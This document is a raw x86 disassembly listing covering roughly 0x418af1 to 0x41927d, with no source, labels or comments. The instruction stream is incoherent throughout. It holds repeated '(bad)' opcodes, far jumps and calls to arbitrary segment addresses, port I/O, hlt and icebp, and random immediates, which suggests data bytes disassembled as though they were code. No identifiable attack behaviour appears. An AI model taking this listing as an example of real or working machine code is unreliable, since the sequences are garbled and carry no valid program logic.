  418af1:	mov    esi,0x2501f2b4
  418af6:	push   cs
  418af7:	jae    0x418aed
  418af9:	and    eax,DWORD PTR [ebp-0x5d039047]
  418aff:	mov    esi,0xd7409425
  418b04:	mov    eax,0xbe1e21a9
  418b09:	jecxz  0x418adb
  418b0b:	hlt    
  418b0c:	outs   dx,BYTE PTR ds:[esi]
  418b0d:	cmp    eax,edi
  418b0f:	outs   dx,DWORD PTR ds:[esi]
  418b10:	mov    bl,0x2b
  418b12:	pusha  
  418b13:	ins    DWORD PTR es:[edi],dx
  418b14:	mov    bl,0x51
  418b16:	or     BYTE PTR [ebx-0x546e7708],0xce
  418b1d:	cld    
  418b1e:	jecxz  0x418b68
  418b20:	xchg   ebp,eax
  418b21:	out    dx,al
  418b22:	mov    dl,0xd1
  418b24:	ret    
  418b25:	call   0xaac00217
  418b2a:	sub    bh,ch
  418b2c:	(bad)  
  418b2e:	pop    esi
  418b2f:	or     BYTE PTR [esi+edi*8],dl
  418b32:	push   ebp
  418b33:	push   cs
  418b34:	fisubr DWORD PTR [ecx]
  418b36:	inc    eax
  418b37:	js     0x418b0b
  418b39:	dec    ebx
  418b3a:	or     DWORD PTR [ebx-0x41],eax
  418b3d:	sbb    eax,0x5b8aa6d6
  418b42:	hlt    
  418b43:	mov    ebp,esp
  418b45:	add    BYTE PTR [eax],bh
  418b47:	add    edx,edi
  418b49:	add    bl,ah
  418b4b:	mov    cl,0x21
  418b4d:	sub    BYTE PTR es:[ebp+0x4],bl
  418b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b52:	jae    0x418b5e
  418b54:	cmp    edi,eax
  418b56:	call   0x9a46787
  418b5b:	cs dec edi
  418b5d:	mov    ecx,0xea8d61f8
  418b62:	lock (bad) 
  418b65:	fdiv   QWORD PTR [eax-0x45a17ce]
  418b6b:	fs das 
  418b6d:	xlat   BYTE PTR ds:[ebx]
  418b6e:	cmc    
  418b6f:	jae    0x418bac
  418b71:	mov    dl,0xf4
  418b73:	sub    bh,0xac
  418b76:	outs   dx,DWORD PTR ds:[esi]
  418b77:	sar    DWORD PTR [ebx+0x51],0xea
  418b7b:	mov    WORD PTR [edi-0x3b],es
  418b7e:	stc    
  418b7f:	jb     0x418beb
  418b81:	fsubrp st(6),st
  418b83:	jb     0x418b23
  418b85:	adc    bh,0x67
  418b88:	out    dx,al
  418b89:	aaa    
  418b8a:	(bad)  
  418b8b:	call   0x4576:0xaa189eb3
  418b92:	sbb    BYTE PTR [ebx+0x24],dl
  418b95:	jge    0x418c03
  418b97:	mov    al,ds:0xd234f6c7
  418b9c:	jecxz  0x418b79
  418b9e:	add    esp,DWORD PTR [edi+esi*1+0x112fd3d4]
  418ba5:	sbb    BYTE PTR [eax+0x22322191],bl
  418bab:	sub    ecx,DWORD PTR [esi+0x4f]
  418bae:	jp     0x418bb4
  418bb0:	dec    ebx
  418bb1:	icebp  
  418bb2:	repnz push es
  418bb4:	mov    eax,0xfb88899b
  418bb9:	bound  esp,QWORD PTR [edx]
  418bbb:	jle    0x418ba7
  418bbd:	mov    esp,cs
  418bbf:	fimul  WORD PTR [eax+0x66]
  418bc2:	jne    0x418c23
  418bc4:	xor    cl,al
  418bc6:	add    BYTE PTR [ecx-0x2db2fa0c],cl
  418bcc:	lods   al,BYTE PTR ds:[esi]
  418bcd:	repz jae 0x418c4b
  418bd0:	ror    BYTE PTR [ebp+0x35456a8c],0xab
  418bd7:	in     eax,0x50
  418bd9:	dec    edi
  418bda:	pusha  
  418bdb:	xor    ch,ah
  418bdd:	xchg   esi,eax
  418bde:	je     0x418bc9
  418be0:	(bad)
  418be5:	xchg   esi,eax
  418be6:	xor    esi,ebx
  418be8:	mov    dh,0x7f
  418bea:	dec    esi
  418beb:	in     al,0x3c
  418bed:	int3   
  418bee:	mov    ecx,0xfd387564
  418bf3:	fbld   TBYTE PTR [edx+0x296c80d2]
  418bf9:	jmp    0x418c47
  418bfb:	mov    ds:0xd922ffd5,eax
  418c00:	loop   0x418c58
  418c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c03:	mov    ds:0xe679b396,eax
  418c08:	ins    DWORD PTR es:[edi],dx
  418c09:	mov    DWORD PTR [esi],ecx
  418c0b:	fwait
  418c0c:	add    al,0x77
  418c0e:	mov    al,ds:0xf9c5294a
  418c13:	(bad)  
  418c14:	mov    esp,0x8cf299dd
  418c19:	pop    edx
  418c1a:	push   edi
  418c1b:	xchg   ebx,eax
  418c1c:	addr16 pop ebx
  418c1e:	jnp    0x418c3e
  418c20:	shl    DWORD PTR [eax],0xf7
  418c23:	rcr    DWORD PTR [eax-0x18ff5553],1
  418c29:	jle    0x418c14
  418c2b:	setne  BYTE PTR [ebx+0x69b5110d]
  418c32:	jp     0x418c45
  418c34:	iret   
  418c35:	xchg   BYTE PTR [eax+0xc],bl
  418c38:	or     al,0xf9
  418c3a:	pushf  
  418c3b:	fwait
  418c3c:	retf   0x16ab
  418c3f:	or     ch,bl
  418c41:	or     BYTE PTR [esi],dh
  418c43:	jl     0x418c4f
  418c45:	xchg   edi,eax
  418c46:	lds    edx,FWORD PTR [ebx+0x33]
  418c49:	enter  0x7b2c,0x5a
  418c4d:	pusha  
  418c4e:	stc    
  418c4f:	mov    ds:0xc60dadf9,eax
  418c54:	and    edx,DWORD PTR fs:[esp+eiz*2-0x62]
  418c59:	ss ja  0x418c0f
  418c5c:	inc    ebx
  418c5d:	jmp    0x5224:0xce5a4e73
  418c64:	push   ds
  418c65:	sub    DWORD PTR [edi+edi*4],eax
  418c68:	or     al,0x74
  418c6a:	and    ch,BYTE PTR [eax]
  418c6c:	cmc    
  418c6d:	mov    ch,0xf
  418c6f:	adc    al,0x6b
  418c71:	add    al,0x54
  418c73:	inc    esi
  418c74:	sub    BYTE PTR [edi-0x3f80625f],dl
  418c7a:	das    
  418c7b:	cmp    eax,0xe9e2c6bf
  418c80:	aas    
  418c81:	out    dx,al
  418c82:	mov    dh,0xc9
  418c84:	out    0x93,eax
  418c86:	mov    al,ds:0x4b87ac95
  418c8b:	shl    cl,0x94
  418c8e:	jns    0x418c2d
  418c90:	fadd   st,st(2)
  418c92:	gs ins BYTE PTR es:[edi],dx
  418c94:	bound  ebx,QWORD PTR [eax]
  418c96:	jns    0x418d0f
  418c98:	inc    ebp
  418c99:	aam    0xbb
  418c9b:	or     BYTE PTR [edx-0x63],al
  418c9e:	pop    ebx
  418c9f:	jl     0x418cbf
  418ca1:	mov    ebp,?
  418ca3:	(bad)  
  418ca4:	push   esp
  418ca5:	adc    eax,0xdad68bb6
  418caa:	(bad)  
  418cab:	test   al,0xf8
  418cad:	pop    eax
  418cae:	pop    ebx
  418caf:	ss mov dl,0xc7
  418cb2:	nop
  418cb3:	fscale 
  418cb5:	or     edi,edi
  418cb7:	outs   dx,DWORD PTR ds:[esi]
  418cb8:	sbb    esp,0xffffffbd
  418cbb:	add    DWORD PTR [eax],esp
  418cbd:	pop    ecx
  418cbe:	es push cs
  418cc0:	mov    bh,0x1f
  418cc2:	and    ebp,DWORD PTR [esi-0x34d315ad]
  418cc8:	dec    edx
  418cc9:	mov    al,ds:0xf68bad21
  418cce:	rol    esi,1
  418cd0:	in     al,0x66
  418cd2:	loop   0x418d4e
  418cd4:	sbb    eax,0xf3fc6939
  418cd9:	std    
  418cda:	mov    ecx,0x62ff8850
  418cdf:	aam    0xc0
  418ce1:	dec    esp
  418ce2:	jne    0x418d5d
  418ce4:	dec    eax
  418ce5:	cmp    eax,0xd243832d
  418cea:	inc    ecx
  418ceb:	std    
  418cec:	in     al,0x81
  418cee:	pop    ecx
  418cef:	mov    bh,0x68
  418cf1:	adc    cl,cl
  418cf3:	add    dl,BYTE PTR [ebx]
  418cf5:	xchg   ebx,eax
  418cf6:	inc    ebp
  418cf7:	adc    dl,BYTE PTR [ebp+esi*4+0x1d]
  418cfb:	pop    esi
  418cfc:	in     al,dx
  418cfd:	fld    TBYTE PTR [eax-0x3]
  418d00:	das    
  418d01:	inc    ecx
  418d02:	lahf   
  418d03:	or     eax,0xb78f4258
  418d08:	adc    eax,0x16e670b0
  418d0d:	neg    eax
  418d0f:	sbb    ebx,DWORD PTR [ebp+0x69]
  418d12:	jo     0x418d38
  418d14:	adc    edi,DWORD PTR [esi]
  418d16:	sub    BYTE PTR [eax+0xba7e56a],bl
  418d1c:	cld    
  418d1d:	push   edx
  418d1e:	push   ebx
  418d1f:	adc    ch,BYTE PTR [ebx]
  418d21:	cld    
  418d22:	out    0xb,eax
  418d24:	in     eax,dx
  418d25:	into   
  418d26:	sub    eax,0x95851a55
  418d2b:	pushf  
  418d2c:	mov    esi,0xb24df54
  418d31:	push   cs
  418d32:	ret    
  418d33:	or     DWORD PTR ds:0xefa5d871,ebx
  418d39:	cmp    al,0xdb
  418d3b:	jbe    0x418cd9
  418d3d:	sub    al,bl
  418d3f:	pop    edx
  418d40:	fadd   st,st(0)
  418d42:	aas    
  418d43:	and    ah,ch
  418d45:	xchg   esi,eax
  418d46:	add    ch,BYTE PTR [ecx-0x7f]
  418d49:	adc    eax,0xa0be3344
  418d4e:	icebp  
  418d4f:	stc    
  418d50:	and    al,0x9d
  418d52:	in     al,dx
  418d53:	add    bh,BYTE PTR ds:0x706dfcd1
  418d59:	sbb    DWORD PTR [ecx],ecx
  418d5b:	(bad)  
  418d5c:	fldcw  WORD PTR [ebp-0x7276bca9]
  418d62:	mov    esi,0xe37018db
  418d67:	sbb    cl,BYTE PTR [edi+0x190da9ec]
  418d6d:	dec    BYTE PTR ds:[esi-0x2d]
  418d71:	ins    BYTE PTR es:[edi],dx
  418d72:	cdq    
  418d73:	aaa    
  418d74:	(bad)  
  418d75:	xlat   BYTE PTR ds:[ebx]
  418d76:	neg    DWORD PTR [ebp+0x64]
  418d79:	push   ss
  418d7a:	retf   0xdbb5
  418d7d:	ss push edx
  418d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d80:	cmp    ah,al
  418d82:	das    
  418d83:	retf   0xbcc9
  418d86:	inc    eax
  418d87:	cmc    
  418d88:	in     al,dx
  418d89:	ds jmp 0x361c:0x6eb404b5
  418d91:	inc    BYTE PTR [ebx-0x4e]
  418d94:	stc    
  418d95:	(bad)  
  418d96:	outs   dx,DWORD PTR ds:[esi]
  418d97:	sub    eax,DWORD PTR [eax]
  418d99:	xchg   ecx,eax
  418d9a:	popf   
  418d9b:	adc    eax,0x6860f7a6
  418da0:	clc    
  418da1:	jns    0x418d42
  418da3:	jne    0x418de0
  418da5:	jb     0x418d2f
  418da7:	call   0x5158ad4d
  418dac:	fnstcw WORD PTR [ecx+edx*4]
  418daf:	push   edx
  418db0:	jg     0x418df5
  418db2:	mov    WORD PTR [esi+0x6f],?
  418db5:	cmp    ch,BYTE PTR [edx]
  418db7:	cmp    eax,0xbb9c5ab1
  418dbc:	ja     0x418d98
  418dbe:	cmp    al,0x21
  418dc0:	out    dx,eax
  418dc1:	clc    
  418dc2:	rcr    bl,cl
  418dc4:	dec    edx
  418dc5:	jae    0x418d81
  418dc7:	fnstcw WORD PTR [eax-0x4d17db86]
  418dcd:	adc    BYTE PTR fs:[ebx],bl
  418dd0:	cmp    al,0xd4
  418dd2:	mov    dl,bl
  418dd4:	(bad)  
  418dd5:	adc    eax,0x8c2aa221
  418dda:	test   BYTE PTR [eax+0x7e],dh
  418ddd:	cwde   
  418dde:	cmp    edi,DWORD PTR [ecx-0x5f6bb0c4]
  418de4:	or     BYTE PTR [ebx-0x8],0xf3
  418de8:	add    eax,0x61e9c33a
  418ded:	sar    BYTE PTR [eax+0x2a7eaee8],1
  418df3:	sbb    BYTE PTR [ecx-0x18],bl
  418df6:	jmp    0x418d8f
  418df8:	hlt    
  418df9:	mov    ds:0x1fb43d6d,eax
  418dfe:	in     eax,0x8b
  418e00:	stos   DWORD PTR es:[edi],eax
  418e01:	pop    ebx
  418e02:	mov    edx,0x5087621
  418e07:	les    ebx,FWORD PTR [esi]
  418e09:	push   edi
  418e0a:	vpunpckhbw ymm2,ymm6,YMMWORD PTR [ebx-0x79]
  418e0f:	out    dx,eax
  418e10:	xchg   ebp,eax
  418e11:	pop    ss
  418e12:	add    ecx,DWORD PTR fs:[eax-0x56]
  418e16:	mov    bl,0xb7
  418e18:	mov    al,0xaf
  418e1a:	scas   al,BYTE PTR es:[edi]
  418e1b:	pop    bx
  418e1d:	add    al,0xdb
  418e1f:	jmp    0x353d:0xa2c940b9
  418e26:	sbb    BYTE PTR [eax],dh
  418e28:	sub    DWORD PTR [edi+0x54],0xe551cf5f
  418e2f:	jns    0x418dfb
  418e31:	xor    al,BYTE PTR [edi]
  418e33:	shr    BYTE PTR [esi],1
  418e35:	inc    edi
  418e36:	jo     0x418e98
  418e38:	jno    0x418e0d
  418e3a:	sub    ch,al
  418e3c:	retf   
  418e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e3e:	pop    ebx
  418e3f:	jg     0x418e59
  418e41:	imul   edi,edx,0x318963e3
  418e47:	retf   
  418e48:	outs   dx,DWORD PTR ds:[esi]
  418e49:	in     al,0xaf
  418e4b:	mov    al,ds:0x3f49ca7b
  418e50:	ret    0x449b
  418e53:	lods   eax,DWORD PTR ds:[esi]
  418e54:	mov    edx,0xd3ebcffc
  418e59:	call   0x6dcb:0xc24de706
  418e60:	leave  
  418e61:	dec    ebx
  418e62:	jmp    0xdaef:0x97b01ff
  418e69:	sbb    BYTE PTR [ebx-0x7b7dfc8d],ah
  418e6f:	ins    BYTE PTR es:[edi],dx
  418e70:	push   cs
  418e71:	std    
  418e72:	(bad)  
  418e73:	pusha  
  418e74:	inc    ecx
  418e75:	mov    ebp,0xa73c59c3
  418e7a:	and    BYTE PTR [ebx+0x38db649a],bh
  418e80:	pop    ds
  418e81:	mov    dl,0x4a
  418e83:	loop   0x418e25
  418e85:	xor    ecx,esi
  418e87:	xchg   esp,eax
  418e88:	aas    
  418e89:	add    DWORD PTR [esi+eax*4-0x77],esp
  418e8d:	cmp    eax,0xf9fe6c1d
  418e92:	xadd   edx,ebp
  418e95:	push   ds
  418e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e97:	xor    BYTE PTR [ebp+0x6e],0x72
  418e9b:	and    BYTE PTR [eax+0xf05aeea],dh
  418ea1:	ins    DWORD PTR es:[edi],dx
  418ea2:	test   eax,0x72e78e2b
  418ea7:	out    0x3,al
  418ea9:	jbe    0x418ef6
  418eab:	aas    
  418eac:	dec    esi
  418ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eae:	lods   al,BYTE PTR ds:[esi]
  418eaf:	sbb    eax,0x305dcf55
  418eb4:	pop    esi
  418eb5:	retf   0x1fd3
  418eb8:	imul   ecx,esp,0xffffffe2
  418ebb:	push   eax
  418ebc:	pushf  
  418ebd:	mov    esp,0xa7bdf5fe
  418ec2:	dec    esp
  418ec3:	push   0x63
  418ec5:	fcmovnbe st,st(7)
  418ec7:	rol    DWORD PTR [edx-0x48],1
  418eca:	cmc    
  418ecb:	jge    0x418f43
  418ecd:	es jo  0x418ed1
  418ed0:	ret    
  418ed1:	xor    cl,dh
  418ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ed4:	lock inc esp
  418ed6:	addr16 ds aam 0xc9
  418eda:	pop    ebp
  418edb:	(bad)  
  418edc:	sahf   
  418edd:	fxch   st(0)
  418edf:	mov    bl,0x5
  418ee1:	mov    ecx,0xded9c38c
  418ee6:	xchg   esi,eax
  418ee7:	xchg   edi,eax
  418ee8:	dec    DWORD PTR [edi-0x52]
  418eeb:	lods   eax,DWORD PTR ds:[esi]
  418eec:	call   0xe7f5:0xd757eab3
  418ef3:	dec    esp
  418ef4:	cmp    ecx,DWORD PTR [esi+0x3b]
  418ef7:	xchg   BYTE PTR [edx+0x44],dh
  418efa:	aam    0xad
  418efc:	cwde   
  418efd:	pusha  
  418efe:	dec    ebx
  418eff:	xor    al,0xd8
  418f01:	mov    WORD PTR [ecx+edi*8-0x11],ss
  418f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f06:	retf   0x697
  418f09:	adc    DWORD PTR [edi],0xaa4d1e33
  418f0f:	aad    0x84
  418f11:	sub    eax,0x3332041b
  418f16:	neg    DWORD PTR [esp+ecx*1]
  418f19:	call   0x5c863514
  418f1e:	push   esp
  418f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f20:	shl    BYTE PTR [edx+0x7a],0x88
  418f24:	jmp    0xfb5e:0x115b6d02
  418f2b:	mov    cl,0x9f
  418f2d:	ins    BYTE PTR es:[edi],dx
  418f2e:	and    cl,BYTE PTR [ebp+0x1c92452]
  418f34:	xchg   ebx,eax
  418f35:	or     BYTE PTR [esi+0x3a51c002],dl
  418f3b:	cld    
  418f3c:	js     0x418f08
  418f3e:	add    ah,BYTE PTR [edi+0x40]
  418f41:	mov    al,0xbf
  418f43:	pop    ss
  418f44:	pop    es
  418f45:	sub    BYTE PTR [edi+0x309d3af2],bl
  418f4b:	rol    esi,1
  418f4d:	and    edi,DWORD PTR [ecx]
  418f4f:	mov    ah,0xf7
  418f51:	push   edi
  418f52:	popa   
  418f53:	fiadd  DWORD PTR ds:[ebx]
  418f56:	jb     0x418f63
  418f58:	jl     0x418f75
  418f5a:	pop    ss
  418f5b:	add    ebx,eax
  418f5d:	cmp    BYTE PTR es:[esi-0x45],0x9a
  418f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f63:	xchg   ecx,eax
  418f64:	sub    ebx,ebx
  418f66:	mov    dl,0xa2
  418f68:	leave  
  418f69:	outs   dx,BYTE PTR ds:[esi]
  418f6a:	loope  0x418fb6
  418f6c:	jbe    0x418fbc
  418f6e:	sti    
  418f6f:	inc    ebp
  418f70:	arpl   WORD PTR [ecx+0x4f19f9e4],cx
  418f76:	fwait
  418f77:	dec    ebp
  418f78:	or     al,0x93
  418f7a:	rcr    BYTE PTR [ebx+edx*4],1
  418f7d:	pop    esi
  418f7e:	dec    esp
  418f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f80:	pop    ebx
  418f81:	imul   ebx,edx,0xaf4b96e0
  418f87:	loop   0x418faa
  418f89:	sbb    al,0xfd
  418f8b:	fnstcw WORD PTR [edx-0x480277a2]
  418f91:	mov    ch,0x46
  418f93:	popf   
  418f94:	aas    
  418f95:	xchg   ebp,eax
  418f96:	mov    gs,WORD PTR [ecx+0x13]
  418f99:	inc    esp
  418f9a:	stc    
  418f9b:	xor    DWORD PTR [ecx],eax
  418f9d:	fwait
  418f9e:	and    eax,0xbe2e846a
  418fa3:	mov    eax,ds:0xc6aa34e9
  418fa8:	test   BYTE PTR fs:[eax+0x44],dh
  418fac:	daa    
  418fad:	inc    edi
  418fae:	ret    
  418faf:	stos   BYTE PTR es:[edi],al
  418fb0:	mov    ebp,0x7cfeaf84
  418fb5:	sub    ebp,DWORD PTR [edx+ecx*2]
  418fb8:	outs   dx,BYTE PTR ds:[esi]
  418fb9:	or     DWORD PTR [ecx+ecx*4-0x3da4177b],esi
  418fc0:	inc    esp
  418fc1:	mov    edi,0xda67df4d
  418fc6:	mov    ds:0xac857415,eax
  418fcb:	imul   esp,DWORD PTR [eax+0x76],0x22
  418fcf:	sub    ch,0x15
  418fd2:	dec    ebx
  418fd3:	adc    eax,0xd82500a1
  418fd8:	dec    eax
  418fd9:	xchg   edx,eax
  418fda:	xchg   ebx,ebx
  418fdc:	jmp    0x9af8:0x10829a9b
  418fe3:	cwde   
  418fe4:	mov    ebp,0x2046f20
  418fe9:	outs   dx,BYTE PTR ds:[esi]
  418fea:	imul   ebx,DWORD PTR [eax],0x38b99a4c
  418ff0:	mov    BYTE PTR [ebx-0x63888f6e],dh
  418ff6:	push   ebp
  418ff7:	cwde   
  418ff8:	sbb    eax,0xa0f68695
  418ffd:	(bad)  
  418ffe:	int    0x7f
  419000:	in     eax,dx
  419001:	imul   esi,DWORD PTR [edi+0x62],0xe4fafe04
  419008:	mov    al,0x52
  41900a:	and    ecx,DWORD PTR [di+0x12]
  41900e:	xchg   edi,eax
  41900f:	inc    esp
  419010:	push   edx
  419011:	mov    DWORD PTR [ebx],edx
  419013:	aad    0xfa
  419015:	jmp    0x418fd8
  419017:	jo     0x418fa3
  419019:	adc    BYTE PTR [edx],dh
  41901b:	(bad)  
  41901d:	mov    eax,0x6af6f1ad
  419022:	mov    al,0x2a
  419024:	pop    ecx
  419025:	or     dh,BYTE PTR [esi]
  419027:	xchg   ebx,eax
  419028:	mov    bl,0x94
  41902a:	add    al,0xd5
  41902c:	mov    esp,0xdc5befe8
  419031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419032:	adc    DWORD PTR [ecx+ebp*4+0x4ddffebc],edx
  419039:	inc    ebx
  41903a:	mov    edi,0x3f4b0705
  41903f:	cmp    al,0x82
  419041:	and    bh,BYTE PTR [edi]
  419043:	pop    edx
  419044:	adc    eax,0x68ee4f30
  419049:	add    eax,DWORD PTR [eax+0x66]
  41904c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41904d:	inc    edi
  41904e:	dec    edx
  41904f:	js     0x419097
  419051:	xchg   BYTE PTR [edx+0x76de2e1c],al
  419057:	pop    esp
  419058:	or     eax,0x83364efb
  41905d:	jnp    0x418fe9
  41905f:	daa    
  419060:	pop    edi
  419061:	xor    eax,0x8226ad
  419066:	popf   
  419067:	sti    
  419068:	jns    0x419027
  41906a:	call   0x3487:0x251f9da0
  419071:	xchg   edx,eax
  419072:	add    ecx,DWORD PTR [edx]
  419074:	jns    0x419037
  419076:	dec    eax
  419077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419078:	lahf   
  419079:	popf   
  41907a:	pop    edi
  41907b:	mov    edi,0x6626530a
  419080:	cmp    dl,BYTE PTR [edi-0x41]
  419083:	xchg   ecx,eax
  419084:	jge    0x4190bc
  419086:	adc    BYTE PTR [edi],cl
  419088:	aaa    
  419089:	iret   
  41908a:	add    BYTE PTR [ebx-0x43cd37b3],cl
  419090:	imul   edx,DWORD PTR [ebp-0x5f],0x683602cc
  419097:	jmp    0xdbd:0x2193eccf
  41909e:	rol    DWORD PTR [ebx],1
  4190a0:	mov    dl,0xe4
  4190a2:	jle    0x41904c
  4190a4:	dec    esi
  4190a5:	xchg   ebp,eax
  4190a6:	dec    ebx
  4190a7:	and    ah,BYTE PTR [esp+edi*8]
  4190aa:	xlat   BYTE PTR ds:[ebx]
  4190ab:	enter  0x8548,0xd2
  4190af:	psubb  mm1,QWORD PTR [edi]
  4190b2:	dec    edx
  4190b3:	fcomp  DWORD PTR ds:0x3ad21a2
  4190b9:	or     eax,0x3fad3f16
  4190be:	cmp    eax,0xd2c7f71b
  4190c3:	jge    0x419074
  4190c5:	(bad)
  4190c8:	into   
  4190c9:	je     0x419077
  4190cb:	add    al,0x49
  4190cd:	enter  0xc79c,0x54
  4190d1:	push   ebp
  4190d2:	or     BYTE PTR [ebx+0x1e],cl
  4190d5:	sbb    ah,BYTE PTR [edx+0xe95b14f]
  4190db:	inc    edx
  4190dc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4190de:	js     0x4190ae
  4190e0:	mov    edx,0x4409b1a3
  4190e5:	push   ebp
  4190e6:	push   edi
  4190e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190e8:	mov    edx,0x160e11a1
  4190ed:	bound  edi,QWORD PTR [edi-0x7f]
  4190f0:	push   cs
  4190f1:	sbb    eax,0xa155b1d1
  4190f6:	add    ecx,DWORD PTR [ebp+0x264abad4]
  4190fc:	dec    esi
  4190fd:	inc    ax
  4190ff:	fs sub eax,0x5ddfc6e5
  419105:	dec    eax
  419106:	data16 jo 0x419099
  419109:	idiv   DWORD PTR [edi]
  41910b:	fistp  QWORD PTR [ecx+eiz*1-0x1033fbc4]
  419112:	mov    ch,0xf
  419114:	inc    ecx
  419115:	out    0x89,eax
  419117:	ins    BYTE PTR es:[edi],dx
  419118:	add    eax,0x43ea9b6e
  41911d:	ins    BYTE PTR es:[edi],dx
  41911e:	sub    ch,ah
  419120:	lock pop ecx
  419122:	and    eax,0x574b094b
  419127:	(bad)  
  419128:	test   al,0xea
  41912a:	addr16 cmc 
  41912c:	data16 scas al,BYTE PTR es:[edi]
  41912e:	cld    
  41912f:	pop    esp
  419130:	pop    esp
  419131:	jb     0x4190f0
  419133:	das    
  419134:	xchg   ebp,eax
  419135:	jb     0x4191a8
  419137:	pop    esi
  419138:	mov    al,0x52
  41913a:	(bad)  
  41913b:	mov    ah,0x21
  41913d:	mov    ah,0xfe
  41913f:	jp     0x419113
  419141:	stc    
  419142:	add    BYTE PTR [edx+0x12790be2],ah
  419148:	(bad)  
  419149:	std    
  41914a:	movlhps xmm6,xmm7
  41914d:	aas    
  41914e:	or     DWORD PTR [ebp+eiz*2+0x334cb77b],ebp
  419155:	sbb    eax,0x86eeb217
  41915a:	dec    esp
  41915b:	sub    ebp,DWORD PTR [esi-0x1b23f7b9]
  419161:	pop    esp
  419162:	inc    esi
  419163:	add    eax,0xb25a6627
  419168:	adc    bl,BYTE PTR [esi]
  41916a:	inc    BYTE PTR [edi-0x1f]
  41916d:	sti    
  41916e:	mov    esi,0x79673cc8
  419173:	mov    esp,0x660ac9e4
  419178:	jo     0x419114
  41917a:	out    dx,eax
  41917b:	(bad)  
  41917c:	pusha  
  41917d:	aad    0xa5
  41917f:	outs   dx,DWORD PTR ds:[esi]
  419180:	and    al,0x26
  419182:	mov    esi,?
  419184:	das    
  419185:	xor    ebp,edi
  419187:	int3   
  419188:	sbb    BYTE PTR [ecx-0x5],dh
  41918b:	(bad)  
  41918c:	fcomp  QWORD PTR ds:0x42a71625
  419192:	mov    ch,0x53
  419194:	and    eax,0x736fc318
  419199:	div    BYTE PTR [ecx+0x4]
  41919c:	enter  0xb486,0x78
  4191a0:	or     BYTE PTR [ebx-0x3af28bf3],bl
  4191a6:	jbe    0x419192
  4191a8:	in     eax,0x8e
  4191aa:	dec    eax
  4191ab:	push   0xd63b256e
  4191b0:	jl     0x419225
  4191b2:	sbb    eax,0x93cc9990
  4191b7:	sahf   
  4191b8:	loop   0x41922d
  4191ba:	shl    DWORD PTR [edx+0x22],1
  4191bd:	mov    ebx,0x8471f9cc
  4191c2:	sub    ebp,ebp
  4191c4:	xchg   esp,eax
  4191c5:	mov    eax,ds:0x2de13d9b
  4191ca:	clc    
  4191cb:	retf   0x33eb
  4191ce:	scas   eax,DWORD PTR es:[edi]
  4191cf:	sti    
  4191d0:	xlat   BYTE PTR ds:[ebx]
  4191d1:	jg     0x419156
  4191d3:	(bad)  
  4191d4:	(bad)  
  4191d5:	ins    BYTE PTR es:[edi],dx
  4191d6:	push   edi
  4191d7:	not    BYTE PTR [edi]
  4191d9:	test   ah,dl
  4191db:	xor    al,0x5d
  4191dd:	clc    
  4191de:	xchg   esi,eax
  4191df:	ins    BYTE PTR es:[edi],dx
  4191e0:	fcomp  QWORD PTR [ebx+0x18]
  4191e3:	and    edi,DWORD PTR [esi]
  4191e5:	cmp    ah,BYTE PTR [edx]
  4191e7:	in     eax,dx
  4191e8:	push   ebp
  4191e9:	test   DWORD PTR [ebx],eax
  4191eb:	shl    DWORD PTR [eax],1
  4191ed:	nop
  4191ee:	mov    eax,0x1c0c9fc0
  4191f3:	mov    esi,DWORD PTR [edx]
  4191f5:	repnz and eax,0xbba20d8c
  4191fb:	outs   dx,DWORD PTR ds:[esi]
  4191fc:	mov    gs,WORD PTR [edx+edi*8]
  4191ff:	lds    esp,FWORD PTR [edi+0x11c9f1c6]
  419205:	data16 mov ah,0x1e
  419208:	ds dec ebp
  41920a:	xor    al,0x9b
  41920c:	xchg   BYTE PTR [eax],dh
  41920e:	xchg   ebp,eax
  41920f:	pop    esi
  419210:	or     DWORD PTR [esi-0x55],ebp
  419213:	sub    DWORD PTR [ecx-0x7b87bca8],eax
  419219:	ins    DWORD PTR es:[edi],dx
  41921a:	and    al,0xe6
  41921c:	inc    edi
  41921d:	lahf   
  41921e:	(bad)  
  41921f:	fcomp  DWORD PTR [eax]
  419221:	sbb    eax,0x254255e2
  419226:	mov    WORD PTR [edx],cs
  419228:	or     al,0x40
  41922a:	mov    esi,0xdc079cc3
  41922f:	xchg   ecx,eax
  419230:	fcom   QWORD PTR [esi-0x77]
  419233:	mov    edi,DWORD PTR [edi+0x3f02fa14]
  419239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41923a:	clc    
  41923b:	push   0x51
  41923d:	cmc    
  41923e:	cmp    esi,ebx
  419240:	hlt    
  419241:	aam    0xfd
  419243:	gs and al,0x1b
  419246:	in     al,0x31
  419248:	dec    esi
  419249:	(bad)  
  41924a:	dec    esp
  41924b:	jbe    0x4192c3
  41924d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41924e:	xor    edi,DWORD PTR [eax]
  419250:	aam    0xa5
  419252:	loope  0x41926d
  419254:	adc    BYTE PTR [ebp-0x1b],0xb9
  419258:	and    ah,BYTE PTR [ebp+0x5e]
  41925b:	cli    
  41925c:	jp     0x4191f5
  41925e:	pop    esp
  41925f:	pop    esp
  419260:	inc    ebx
  419261:	cld    
  419262:	pop    ecx
  419263:	jmp    0x853e:0x76efcff0
  41926a:	xor    BYTE PTR [ecx+ebp*1],bh
  41926d:	xchg   edx,eax
  41926e:	arpl   WORD PTR [ecx],bp
  419270:	xchg   esp,eax
  419271:	cmp    ch,ah
  419273:	pop    ecx
  419274:	or     dh,bl
  419276:	in     al,dx
  419277:	repnz (bad) 
  419279:	ror    DWORD PTR [esi+esi*8-0x4],cl
  41927d:	es mov bl,0x5f
